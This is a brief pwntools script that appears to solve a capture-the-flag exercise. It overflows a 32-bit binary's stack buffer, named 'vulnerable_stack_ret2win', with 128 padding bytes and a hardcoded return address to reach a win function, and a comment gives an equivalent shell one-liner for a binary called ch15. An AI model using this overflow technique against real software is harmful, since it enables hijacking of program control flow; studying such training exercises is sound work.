from pwn import *

context.log_level = 'debug'
p = process('./vulnerable_stack_ret2win/ELF_32/vulnerable_stack_ret2win')

payload = b'A' *128 + b'\xa6\x91\x04\x08'

p.sendline(payload)

p.interactive()

# (python -c "print 'A'*128+'\x64\x84\x04\x08'"; cat -) | ./ch15